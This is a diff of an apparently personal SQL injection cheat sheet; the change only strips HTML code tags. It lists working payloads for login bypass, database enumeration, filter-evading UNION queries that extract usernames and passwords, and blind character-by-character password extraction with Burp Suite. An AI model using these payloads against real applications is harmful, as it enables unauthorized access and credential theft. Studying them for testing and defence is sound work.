@@ -10,7 +10,6 @@
   <header>
     <h4 align="right">@b0ydC</h4>
   </header>
-
   <main>
     <article>
      
@@ -18,95 +17,91 @@
 
 <h2>1. DEFAULT TEST ATTEMPTS</h2>
   
-<code><b>INFO:</b> List of the normal characters used to test the vulnerability. Can be used on GET:POST "SEARCH/SELECT". Getting errors can represent the 
-presence of the vulnerability. <code>[HTTP/2 500 Internal Server Error]</code> It can be URL parameters, input fields, etc.</code>
+<b>INFO:</b> List of the normal characters used to test the vulnerability. Can be used on GET:POST "SEARCH/SELECT". Getting errors can represent the 
+presence of the vulnerability.[HTTP/2 500 Internal Server Error] It can be URL parameters, input fields, etc.
   
-<br><br><code><b>C1:</b> ' | C2: '' ("try with space as well") ' ' | C3: " | C4: '-- | C5: "" | C6: '#</code><br><br>
+<br><br><b>C1:</b> ' | C2: '' ("try with space as well") ' ' | C3: " | C4: '-- | C5: "" | C6: '#<br><br>
 
-<code><b>NOTE:</b><br><br>
-- It is needed to check the behavior of the application GUI and headers [burpsuite].</code>
-
+<b>NOTE:</b><br><br>
+- It is needed to check the behavior of the application GUI and headers [burpsuite].
 
 <h2>2. HIDDEN DATA TECHNIQUES</h2>
 
-<code><b>INFO:</b> It will use some boolean conditions in order to retrieve content from the database. If the vulnerability is present the goal is to "close" the 
-query and retrieve all, for that boolean conditions are used.</code><br>
+<b>INFO:</b> It will use some boolean conditions in order to retrieve content from the database. If the vulnerability is present the goal is to "close" the 
+query and retrieve all, for that boolean conditions are used.<br>
   
-<br><code><b>C1:</b> <u>TRUE</u> ' OR 1=1-- | C2: <u>TRUE</u> ' and 'a'='a-- | ' and/or 'a'='a# | C3: <u>FALSE</u> ' and 1=2;-- | C4: <u>TRUE</u> ' OR 1=1#<br>
+<br><b>C1:</b> <u>TRUE</u> ' OR 1=1-- | C2: <u>TRUE</u> ' and 'a'='a-- | ' and/or 'a'='a# | C3: <u>FALSE</u> ' and 1=2;-- | C4: <u>TRUE</u> ' OR 1=1#<br>
 
-<br><b>SAMPLES:</b> ' or "1"="1"# | ' or 1=1-- - | ' and 1=1#</code>
-
+<br><b>SAMPLES:</b> ' or "1"="1"# | ' or 1=1-- - | ' and 1=1#
 
 <h2>3. LOGIN BYPASS TECHNIQUES</h2>
 
-<code><b>INFO:</b> It is used to bypass login forms, guessing users or after collecting some of them.</code><br>
+<b>INFO:</b> It is used to bypass login forms, guessing users or after collecting some of them.<br>
 
-<br><code><b>C1:</b> USER'-- </code><br>
+<br><b>C1:</b> USER'-- <br>
 
-<br><code><b>SAMPLE:</b> adminstrator'-- </code>
-
+<br><b>SAMPLE:</b> adminstrator'-- 
 
 <h2>4. DATABASE TYPE/VERSION/NUMBER TECHNIQUES</h2>
 
-<code><b>INFO:</b> Techniques used to retrieve the database version, columns number, field type, etc. -- or # are used in SQL query 
-language to comment ignoring the rest of the query.</code><br>
+<b>INFO:</b> Techniques used to retrieve the database version, columns number, field type, etc. -- or # are used in SQL query 
+language to comment ignoring the rest of the query.<br>
 
 <br>::: PRE-REQS:<br><br>
   
 <u>4.1 GET COLUMN NUMBER</u><br><br>
 
-<code>C1METHOD: ' ORDER BY 1-- <br>
-C2METHOD: ' UNION SELECT NULL--</code><br><br>
+C1METHOD: ' ORDER BY 1-- <br>
+C2METHOD: ' UNION SELECT NULL--<br><br>
 
-<code><b>NOTE:</b><br><br> 
-- change between "--" and "#"</code><br><br>
+<b>NOTE:</b><br><br> 
+- change between "--" and "#"<br><br>
   
 <u>4.2 GET FIELD TYPE</u><br><br>
   
-<code>C1: STRING TEST ' UNION SELECT 'a',NULL,NULL,NULL--<br>
+C1: STRING TEST ' UNION SELECT 'a',NULL,NULL,NULL--<br>
 C2: STRING TEST ' UNION SELECT NULL,'a',NULL,NULL--<br>
-C3: ORACLE TEST ' UNION SELECT 'a','a' FROM DUAL--</code><br><br>
+C3: ORACLE TEST ' UNION SELECT 'a','a' FROM DUAL--<br><br>
 
-<code><b>NOTE:</b><br><br> 
+<b>NOTE:</b><br><br> 
 - It is needed to be iterative so you can find the right field type. For that number of columns is needed. Also, for ORACLE the select 
-statement is needed a table to search from, it can be any table.</code><br>
+statement is needed a table to search from, it can be any table.<br>
   
 <br><u>COMMON TESTS</u><br><br>
 
 <b>ORACLE:</b><br><br>
 
-<code>C1: ' UNION SELECT 'a','a' FROM DUAL--<br>
-C2: ' UNION SELECT banner,NULL FROM v$version--</code><br><br>
+C1: ' UNION SELECT 'a','a' FROM DUAL--<br>
+C2: ' UNION SELECT banner,NULL FROM v$version--<br><br>
 
-<code>- assuming it has two columns and both are type string.</code><br><br>
+- assuming it has two columns and both are type string.<br><br>
 
 MYSQL | SQL:<br><br>
 
-<code>C1: ' UNION SELECT @@version,NULL#<br><br>
-SAMPLE: ' UNION SELECT NULL,table_name FROM information_schema.tables#</code><br><br>
+C1: ' UNION SELECT @@version,NULL#<br><br>
+SAMPLE: ' UNION SELECT NULL,table_name FROM information_schema.tables#<br><br>
 
-<code>- assuming it has two columns and first is type string.</code><br><br>
+- assuming it has two columns and first is type string.<br><br>
 
 MYSQL FUNCTIONS:<br><br>
 
-<code>SAMPLE:value',(select version()))#<br><br>
+SAMPLE:value',(select version()))#<br><br>
 SAMPLE:value',(select user()))# <br><br>
 
 - DATABASE()<br>
-- CURRENT_USER()</code><br><br>
+- CURRENT_USER()<br><br>
   
 POSTGRESQL:<br><br>
 
-<code>SAMPLE: ' UNION SELECT ()version,NULL#<br>
-SAMPLE: ' and substring((version()),1,1) = '0'#</code><br><br>
+SAMPLE: ' UNION SELECT ()version,NULL#<br>
+SAMPLE: ' and substring((version()),1,1) = '0'#<br><br>
 
-<code>NOTE:<br><br> 
-- You can use version(), user() etc.</code>
-
+NOTE:<br><br> 
+- You can use version(), user() etc.
 
 <h2>5. LISTING DATABASE CONTENT TECHNIQUES</h2>
 
-<code>INFO: Used to retrieve the name of table, columns, etc. to retrieve content from database.</code> 
+INFO: Used to retrieve the name of table, columns, etc. to retrieve content from database.
 
 <h2>NON-ORACLE</h2>
 
@@ -115,17 +110,17 @@ SAMPLE: ' and substring((version()),1,1) = '0'#</code><br><br>
 1. get column number<br>
 2. get field type<br><br>
 
-<code>- after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.</code><br><br>
+- after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.<br><br>
 
-<code>C1: ' UNION SELECT table_name,NULL from information_schema.tables--<br><br>
+C1: ' UNION SELECT table_name,NULL from information_schema.tables--<br><br>
 
-<code>- once table is identified, it is time to retrieve the COLUMNS of the table</code><br><br>
+- once table is identified, it is time to retrieve the COLUMNS of the table<br><br>
 
 C2: ' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--<br><br>
 
-<code>- once table_name and columns are identified, it is time to retrieve the CONTENT</code><br><br>
+- once table_name and columns are identified, it is time to retrieve the CONTENT<br><br>
 
-C3: ' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</code><br>
+C3: ' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--<br>
 
 <h2>ORACLE</h2>
 
@@ -134,43 +129,43 @@ C3: ' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</code><br>
 1. get column number<br>
 2. get field type<br><br>
 
-<code>- after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.</code><br><br>
+- after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.<br><br>
 
-<code>C1: ' UNION SELECT table_name,NULL from ALL_TABLES--<br><br>
+C1: ' UNION SELECT table_name,NULL from ALL_TABLES--<br><br>
 
-<code>- once table is identified, it is time to retrieve the COLUMNS of the table</code><br><br>
+- once table is identified, it is time to retrieve the COLUMNS of the table<br><br>
 
 C2: ' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--<br><br>
 
-<code>- once table_name and columns are identified, it is time to retrieve the CONTENT</code><br><br>
+- once table_name and columns are identified, it is time to retrieve the CONTENT<br><br>
 
-C3: ' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</code><br><br>
+C3: ' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--<br><br>
 
-<code>NOTE:<br><br> 
+NOTE:<br><br> 
 - Both ways needs to know the column number, field type and both examples are assuming it has two columns and both type string.</code>  
 
 <h2>6. UNION ATTACKS TECHNIQUES</h2>
 
-<code>INFO: If the vulnerability is present, UNION attacks can be used to retrieve content from other tables.</code><br><br>
+INFO: If the vulnerability is present, UNION attacks can be used to retrieve content from other tables.<br><br>
 
 <u>GET QUERY COLUMNS NUMBER</u><br><br>
 
-<code>C1: ' UNION SELECT NULL--</code><br><br>
+C1: ' UNION SELECT NULL--<br><br>
 
-<code>- add null values until the error disappears</code><br><br>
+- add null values until the error disappears<br><br>
 
 <u>GET COLUMN FIELD TYPE</u><br><br>
 
-<code>C2: NON-ORACLE ' UNION SELECT NULL,'a'--<br><br>
-C3: ORACLE ' UNION SELECT 'a','a' FROM DUAL--</code><br><br>
+C2: NON-ORACLE ' UNION SELECT NULL,'a'--<br><br>
+C3: ORACLE ' UNION SELECT 'a','a' FROM DUAL--<br><br>
 
-<code>- assuming two columns<br><br>
+- assuming two columns<br><br>
 
-... after those steps, please refer to LISTING DATABASE CONTENT TECHNIQUES, it will apply the same.</code><br><br>
+... after those steps, please refer to LISTING DATABASE CONTENT TECHNIQUES, it will apply the same.<br><br>
 
 <u>FILTER BYPASS VIA XML ENCODING</u><br><br>
 
-<code>NOTE:<br> <br>
+NOTE:<br> <br>
 - First thing to check, headers to see if exist some XML code that is related to the behavior of the request.<br> 
 - If yes, try changing values to see how it behaves.<br>
 - Try different mathematical expressions to check if input is evaluated.<br><br>
@@ -180,83 +175,83 @@ SAMPLE: 1+1<br><br>
 - If expressions are evaluated, it means that possible the vulnerability is present. Try injecting payloads and check results. <br><br> 
 
 NOTE:<br><br> 
-- If you get some responses that the request has been blocked, try encoding the payload information. [extension: hackvertor]</code><br><br> 
+- If you get some responses that the request has been blocked, try encoding the payload information. [extension: hackvertor]<br><br> 
 
 <u>CHECK COLUMNS</u><br><br>  
 
-<code>1 UNION SELECT NULL</code><br><br> 
+1 UNION SELECT NULL<br><br> 
 
-<code>NOTE:<br><br> 
-- If you found only one column, you need to concatenate. || '~' ||</code><br><br>
+NOTE:<br><br> 
+- If you found only one column, you need to concatenate. || '~' ||<br><br>
 
 <u>RETRIEVE CONTENT</u><br><br>
 
-<code>SAMPLE: 1 UNION SELECT username || '~' || password FROM users</code><br><br>
+SAMPLE: 1 UNION SELECT username || '~' || password FROM users<br><br>
 
-<code>ENCODED SAMPLE: <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></code>
+ENCODED SAMPLE: <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></code>
 
 <h2>7. BLIND ATTACKS TECHNIQUES</h2>
 
-<code>INFO: Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small changes. <br>
-Inspect the headers in burpsuite to check if exist something querying the application.</code><br><br>
+INFO: Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small changes. <br>
+Inspect the headers in burpsuite to check if exist something querying the application.<br><br>
 
 <u>CONDITIONAL RESPONSES</u><br><br>
 
-<code>C1: TRUE ' AND '1'='1<br>
-C2: FALSE ' AND '1'='2</code><br><br>
+C1: TRUE ' AND '1'='1<br>
+C2: FALSE ' AND '1'='2<br><br>
 
-<code>- To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.</code><br><br>
+- To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.<br><br>
 
 <u>CHECK IF TABLE EXIST</u><br><br>
   
-<code>C1: TRUE condition means table exist ! ' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</code><br><br>
+C1: TRUE condition means table exist ! ' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a<br><br>
 
 <u>CHECK IF COLUMN VALUE EXIST</u><br><br>
 
-<code>C1: TRUE ' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a<br>
-SAMPLE: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code><br><br>
+C1: TRUE ' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a<br>
+SAMPLE: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a<br><br>
 
-<code>NOTE:<br> <br>
-- condition means column value exist ![guess or enumerate]</code> <br><br>
+NOTE:<br> <br>
+- condition means column value exist ![guess or enumerate]<br><br>
 
 <u>CHECK THE CHARACTER LENGHT OF THE COLUMN VALUE</u><br><br>
   
-<code>C1: ' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a<br><br>
-SAMPLE: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</code><br><br>
+C1: ' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a<br><br>
+SAMPLE: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a<br><br>
 
-<code>NOTE:<br> <br>
+NOTE:<br> <br>
 - Here a series of incremental query's working with the TRUE statement are needed, once the number reached hits the FALSE statement <br>
-the lenght is founded.</code><br><br>
+the lenght is founded.<br><br>
 
 <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS"</u><br><br>
   
-<code>C1: ' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value<br><br>
-SAMPLE: ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</code><br><br>
+C1: ' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value<br><br>
+SAMPLE: ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't<br><br>
 
-<code>- "first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than the value...</code><br><br>
+- "first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than the value...<br><br>
 
-<code>C2: ' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's<br><br>
-SAMPLE: ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</code><br><br>
+C2: ' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's<br><br>
+SAMPLE: ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's<br><br>
 
-<code>- ...if TRUE the first character of the value is equals to the value"</code><br><br>
+- ...if TRUE the first character of the value is equals to the value"<br><br>
 
-<code>NOTE:<br> <br>
-- or "SUBSTR"</code><br><br>
+NOTE:<br> <br>
+- or "SUBSTR"<br><br>
 
 <u>CHECK THE CHARACTERS OF THE COLUMN</u><br><br>
   
-<code>C1: ' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§<br><br>
-SAMPLE: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</code><br><br>
+C1: ' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§<br><br>
+SAMPLE: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§<br><br>
 
-<code>- So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to iterate more times with each letter, 
-number, etc. For that reason a pre-req is to know the value lenght.</code><br><br>
+- So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to iterate more times with each letter, 
+number, etc. For that reason a pre-req is to know the value lenght.<br><br>
 
 CLUSTER BOMB ATTACK ! - two positions<br><br>
 
-<code>C1: ' AND (SELECT SUBSTRING(COLUMN_NAME,§1§,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</code><br><br>
+C1: ' AND (SELECT SUBSTRING(COLUMN_NAME,§1§,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§<br><br>
 
-<code>NOTE:<br> <br>
-- Remember the TRUE/FALSE logic and the response associated to that. That will help to know which values are correct = TRUE.</code> 
+NOTE:<br> <br>
+- Remember the TRUE/FALSE logic and the response associated to that. That will help to know which values are correct = TRUE. 
 
     </article>
   </main>
